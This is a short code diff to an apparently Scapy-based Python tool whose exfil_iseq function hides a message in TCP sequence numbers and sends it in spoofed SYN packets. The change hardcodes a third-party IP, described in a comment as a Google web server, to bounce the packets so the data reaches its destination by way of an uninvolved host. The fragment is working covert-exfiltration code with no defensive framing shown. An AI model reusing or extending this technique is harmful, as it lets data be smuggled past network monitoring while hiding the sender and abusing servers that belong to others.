@@ -101,8 +101,9 @@ def exfil_iseq(spoof, destination, dstport, message, bounce):
     exfilMsg = convert_iseq(message)
     # if bounce == 1 then dst=spoof, src=destination, dport=80, sport=dstport
     # window = 1339 will indicate that this is a bounced packet
+    # Let bounce off a google www server.
     if bounce == 1:
-        pkt = IP(src=destination, dst=spoof) / TCP(sport=dstport, dport=80, flags='S')
+        pkt = IP(src=destination, dst='65.199.32.22') / TCP(sport=dstport, dport=80, flags='S')
     else:
         pkt = IP(src=spoof, dst=destination) / TCP(dport=dstport, flags='S')
 
